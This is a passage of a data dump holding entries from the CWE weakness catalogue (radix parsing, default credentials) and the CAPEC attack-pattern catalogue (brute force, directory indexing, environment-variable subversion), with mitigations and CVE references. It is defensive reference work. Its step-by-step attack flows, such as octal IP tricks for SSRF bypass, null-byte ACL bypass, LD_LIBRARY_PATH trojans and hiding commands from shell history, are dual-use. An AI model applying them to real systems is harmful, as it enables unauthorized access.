PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:IMPACT:DoS: Crash, Exit, or Restart:LIKELIHOOD:Medium::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:For commonly-used APIs and resource types, automated tools often have signatures that can spot this issue.::METHOD:Automated Dynamic Analysis:DESCRIPTION:Some compiler instrumentation tools such as AddressSanitizer (ASan) can indirectly detect some instances of this weakness.::\",\"::PHASE:Implementation:DESCRIPTION:Change the code's logic so that the resource is only closed once. This might require simplifying or refactoring. This fix can be simple to do in small code blocks, but more difficult when multiple closes are buried within complex conditionals.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:It can be effective to implement a flag that is (1) set when the resource is opened, (2) cleared when it is closed, and (3) checked before closing. This approach can be useful when there are disparate cases in which closes must be performed. However, flag-tracking can increase code complexity and requires diligent compliance by the programmer.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:When closing a resource, set the resource's associated variable to NULL or equivalent value for the given language. Some APIs will ignore this null value without causing errors. For other APIs, this can lead to application crashes or exceptions, which may still be preferable to corrupting an unintended resource such as memory or data.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2019-13351:DESCRIPTION:file descriptor double close can cause the wrong file to be associated with a file descriptor.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-13351::REFERENCE:CVE-2006-5051:DESCRIPTION:Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition that leads to a double free (CWE-415).:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5051::REFERENCE:CVE-2004-0772:DESCRIPTION:Double free resultant from certain error conditions.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0772::\",,,\"\",,\"::TYPE:Terminology:NOTE:The terms related to release may vary depending on the type of resource, programming language, specification, or framework. Close has been used synonymously for the release of resources like file descriptors and file handles. Return is sometimes used instead of Release. Free is typically used when releasing memory or buffers back into the system for reuse.::\",\n1389,\"Incorrect Parsing of Numbers with Different Radices\",Base,Incomplete,\"The product parses numeric input assuming base 10 (decimal) values, but it does not account for inputs that use a different base number (radix).\",\"Frequently, a numeric input that begins with 0 is treated as octal, or 0x causes it to be treated as hexadecimal, e.g. by the inet_addr() function. For example, 023 (octal) is 35 decimal, or 0x31 is 49 decimal. Other bases may be used as well. If the developer assumes decimal-only inputs, the code could produce incorrect numbers when the inputs are parsed using a different base. This can result in unexpected and/or dangerous behavior. For example, a 0127.0.0.1 IP address is parsed as octal due to the leading 0, whose numeric value would be the same as 87.0.0.1 (decimal), where the developer likely expected to use 127.0.0.1. The consequences vary depending on the surrounding code in which this weakness occurs, but they can include bypassing network-based access control using unexpected IP addresses or netmasks, or causing apparently-symbolic identifiers to be processed as if they are numbers. In web applications, this can enable bypassing of SSRF restrictions.\",::NATURE:ChildOf:CWE ID:704:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Input validation used may assume decimal bases during conditional checks, when it may not always be the case.::PHASE:Implementation:NOTE:The application may rely on a service that supports different numerical bases.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:LIKELIHOOD:Unknown:NOTE:An attacker may use an unexpected numerical base to access private application resources.::SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:IMPACT:Alter Execution Logic:LIKELIHOOD:Unknown:NOTE:An attacker may use an unexpected numerical base to bypass or manipulate access control mechanisms.::\",\"\",\"::PHASE:Implementation:STRATEGY:Enforcement by Conversion:DESCRIPTION:If only decimal-based values are expected in the application, conditional checks should be created in a way that prevent octal or hexadecimal strings from being checked. This can be achieved by converting any numerical string to an explicit base-10 integer prior to the conditional check, to prevent octal or hex values from ever being checked against the condition.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:If various numerical bases do need to be supported, check for leading values indicating the non-decimal base you wish to support (such as 0x for hex) and convert the numeric strings to integers of the respective base. Reject any other alternative-base string that is not intentionally supported by the application.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:If regular expressions are used to validate IP addresses, ensure that they are bounded using ^ and $ to prevent base-prepended IP addresses from being matched.::\",\"::REFERENCE:CVE-2021-29662:DESCRIPTION:Chain: Use of zero-prepended IP addresses in Perl-based IP validation module can lead to an access control bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-29662::REFERENCE:CVE-2021-28918:DESCRIPTION:Chain: Use of zero-prepended IP addresses in a product that manages IP blocks can lead to an SSRF.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-28918::REFERENCE:CVE-2021-29921:DESCRIPTION:Chain: Use of zero-prepended IP addresses in a Python standard library package can lead to an SSRF.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-29921::REFERENCE:CVE-2021-29923:DESCRIPTION:Chain: Use of zero-prepended IP addresses in the net Golang library can lead to an access control bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-29923::REFERENCE:CVE-2021-29424:DESCRIPTION:Chain: Use of zero-prepended IP addresses in Perl netmask module allows bypass of IP-based access control.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-29424::REFERENCE:CVE-2016-4029:DESCRIPTION:Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).:LINK:https://www.cve.org/CVERecord?id=CVE-2016-4029::REFERENCE:CVE-2020-13776:DESCRIPTION:Mishandling of hex-valued usernames leads to unexpected decimal conversion and privilege escalation in the systemd Linux suite.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-13776::\",,,\"\",,\"\",\n1392,\"Use of Default Credentials\",Base,Incomplete,\"The product uses default credentials (such as passwords or cryptographic keys) for potentially critical functionality.\",\"It is common practice for products to be designed to use default keys, passwords, or other mechanisms for authentication. The rationale is to simplify the manufacturing process or the system administrator's task of installation and deployment into an enterprise. However, if admins do not change the defaults, it is easier for attackers to bypass authentication quickly across multiple organizations.\",::NATURE:ChildOf:CWE ID:1391:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Authentication:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2022-30270:DESCRIPTION:Remote Terminal Unit (RTU) uses default credentials for some SSH accounts:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30270::REFERENCE:CVE-2021-41192:DESCRIPTION:data visualization/sharing package uses default secret keys or cookie values if they are not specified in environment variables:LINK:https://www.cve.org/CVERecord?id=CVE-2021-41192::REFERENCE:CVE-2021-38759:DESCRIPTION:microcontroller board has default password:LINK:https://www.cve.org/CVERecord?id=CVE-2021-38759::REFERENCE:CVE-2010-2306:DESCRIPTION:Intrusion Detection System (IDS) uses the same static, private SSL keys for multiple devices and installations, allowing decryption of SSL traffic:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2306::\",,,\"\",,\"\","
  },
  "doc-865590069d2a09ba39e89c780d9e9027": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n1,\"Accessing Functionality Not Properly Constrained by ACLs\",Standard,Draft,\"In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Brute force guessing of resource names:TECHNIQUE:Brute force guessing of user names / credentials:TECHNIQUE:Brute force guessing of function names / actions::STEP:2:PHASE:Explore:DESCRIPTION:[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions:TECHNIQUE:Use the web inventory of all forms and inputs and apply attack data to those inputs.:TECHNIQUE:Use a packet sniffer to capture and record network traffic:TECHNIQUE:Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.::STEP:3:PHASE:Experiment:DESCRIPTION:[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.:TECHNIQUE:Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)::\",\"::The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.::The various resources, or individual URLs, must be somehow discoverable by the attacker::The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.::\",\"::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as NoAccess, with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user. Having done so, any direct access to those protected Servlets will be prohibited by the web container. In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.::\",\"::Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a Single front controller pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets. If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted.::\",\"::276::285::434::693::732::1191::1193::1220::1297::1311::1314::1315::1318::1320::1321::1327::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: ServicesFile Permissions Weakness::\",\"\",\n11,\"Cause Web Server Misclassification\",Detailed,Draft,\"An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:635::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Footprint file input vectors] Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.:TECHNIQUE:Attacker manually crawls application to identify file inputs:TECHNIQUE:Attacker uses an automated tool to crawl application identify file inputs:TECHNIQUE:Attacker manually assesses strength of access control protecting native application files from user control:TECHNIQUE:Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests::STEP:2:PHASE:Experiment:DESCRIPTION:[File misclassification shotgunning] An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.:TECHNIQUE:Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.:TECHNIQUE:Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.::STEP:3:PHASE:Experiment:DESCRIPTION:[File misclassification sniping] Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.:TECHNIQUE:Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.:TECHNIQUE:Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.::STEP:4:PHASE:Exploit:DESCRIPTION:[Disclose information] The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).:TECHNIQUE:Manipulate the file names that are explicitly sent to the server.:TECHNIQUE:Manipulate the MIME sent in order to confuse the web server.::\",\"::Web server software must rely on file name or file extension for processing.::The attacker must be able to make HTTP requests to the web server.::\",\"::SKILL:To modify file name or file extension:LEVEL:Low::SKILL:To use misclassification to force the Web server to disclose configuration information, source, or binary data:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implementation: Server routines should be determined by content not determined by filename or file extension.::\",\"::J2EE application servers are supposed to execute Java Server Pages (JSP). There have been disclosure issues relating to Orion Application Server, where an attacker that appends either a period (.) or space characters to the end of a legitimate Http request, then the server displays the full source code in the attackers' web browser. http://victim.site/login.jsp. Since remote data and directory access may be accessed directly from the JSP, this is a potentially very serious issue. [REF-6]::\",\"::430::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.006:ENTRY NAME:Masquerading: Space after Filename::\",\"\",\n112,\"Brute Force\",Meta,Draft,\"In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset.\",\"\",,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.:TECHNIQUE:Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded.::STEP:2:PHASE:Explore:DESCRIPTION:[Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.:TECHNIQUE:If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.):TECHNIQUE:If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.:TECHNIQUE:If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.:TECHNIQUE:Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret.::STEP:3:PHASE:Explore:DESCRIPTION:[Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value.::STEP:4:PHASE:Exploit:DESCRIPTION:[Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).::\",\"::The attacker must be able to determine when they have successfully guessed the secret. As such, one-time pads are immune to this type of attack since there is no way to determine when a guess is correct.::\",\"::SKILL:The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.::\",\"::Repeated submissions of incorrect secret values may indicate a brute force attack. For example, repeated bad passwords when accessing user accounts or repeated queries to databases using non-existent keys.::Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.::If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.::Use a secret space that is well known and with no known patterns that may reduce functional size.::Do not provide the means for an attacker to determine success independently. This forces the attacker to check their guesses against an external authority, which can slow the attack and warn the defender. This mitigation may not be possible if testing material must appear externally, such as with a transmitted cryptotext.::\",\"\",\"::330::326::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110:ENTRY NAME:Brute Force::::TAXONOMY NAME:WASC:ENTRY ID:11:ENTRY NAME:Brute Force::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Brute force attack::\",\"\",\n114,\"Authentication Abuse\",Meta,Draft,\"An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.\",\"\",,Medium,\"\",\"\",\"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.::\",\"\",\"::A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.::\",\"\",\"\",\"\",\"\",\"::287::1244::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n115,\"Authentication Bypass\",Meta,Draft,\"An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.\",\"\",,Medium,\"\",\"\",\"::An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.::\",\"\",\"::A client application, such as a web browser, or a scripting language capable of interacting with the target.::\",\"\",\"\",\"\",\"\",\"::287::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n122,\"Privilege Abuse\",Meta,Draft,\"An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.\",\"\",High,Medium,\"::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.::The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.::\",\"::SKILL:Adversary can leverage privileged features they already have access to without additional effort or skill. Adversary is only required to have access to an account with improper priveleges.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. The ability to access the target is required.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Configure account privileges such privileged/administrator functionality is not exposed to non-privileged/lower accounts.::\",\"::Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations.::\",\"::269::732::1317::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n125,\"Flooding\",Meta,Stable,\"An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.\",\"\",High,Medium,\"\",\"\",\"::Any target that services requests is vulnerable to this attack on some level of scale.::\",\"\",\"::A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.::\",\"::Ensure that protocols have specific limits of scale configured.::Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.::Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::\",\"\",\"::404::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Traffic flood::\",\"\",\n127,\"Directory Indexing\",Detailed,Draft,\"An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:54::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.:TECHNIQUE:Send requests to the web server for common directory names:TECHNIQUE:If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.:TECHNIQUE:Search for uncommon or potentially user created directories that may be present.::STEP:2:PHASE:Experiment:DESCRIPTION:[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods:TECHNIQUE:Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.:TECHNIQUE:Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.:TECHNIQUE:Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a / request::STEP:3:PHASE:Exploit:DESCRIPTION:[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods:TECHNIQUE:Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a / request:TECHNIQUE:Try other known exploits to elevate privileges sufficient to bypass protected directories.:TECHNIQUE:List the files in the directory by issuing a request with the URL ending in a / slash.:TECHNIQUE:Access the files via direct URL and capture contents.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.::\",\"::The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.::The adversary must be able to control the path that is requested of the target.::The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.::The server version or patch level must not inherently prevent known directory listing attacks from working.::\",\"::SKILL:To issue the request to URL without given a specific file name:LEVEL:Low::SKILL:To bypass the access control of the directory of listings:LEVEL:High::\",\"::Ability to send HTTP requests to a web application.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Information Leakage::\",\"::1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.::2. Preventing with .htaccess in Apache web server: In .htaccess, write Options-indexes.::3. Suppressing error messages: using error 403 Forbidden message exactly like error 404 Not Found message.::\",\"::The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80 The target application does not have direct hyperlink to the backup directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a db_dump.php file in it. This sensitive data should not be disclosed publicly.::\",\"::424::425::288::285::732::276::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::\",\"\",\n13,\"Subverting Environment Variable Values\",Detailed,Stable,\"The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:77::NATURE:CanPrecede:CAPEC ID:14::NATURE:PeerOf:CAPEC ID:10::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.:TECHNIQUE:Alter known environment variables such as $PATH, $HOSTNAME, or LD_LIBRARY_PATH and see if application behavior changes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources.::\",\"::An environment variable is accessible to the user.::An environment variable used by the application can be tainted with user supplied data.::Input data used in an environment variable is not validated properly.::The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an adversary may attempt to manipulate that variable.::\",\"::SKILL:In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.:LEVEL:Low::SKILL:Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::\",\"::Protect environment variables against unauthorized read and write access.::Protect the configuration files which contain environment variables against illegitimate read and write access.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.::\",\"::Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)::The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate 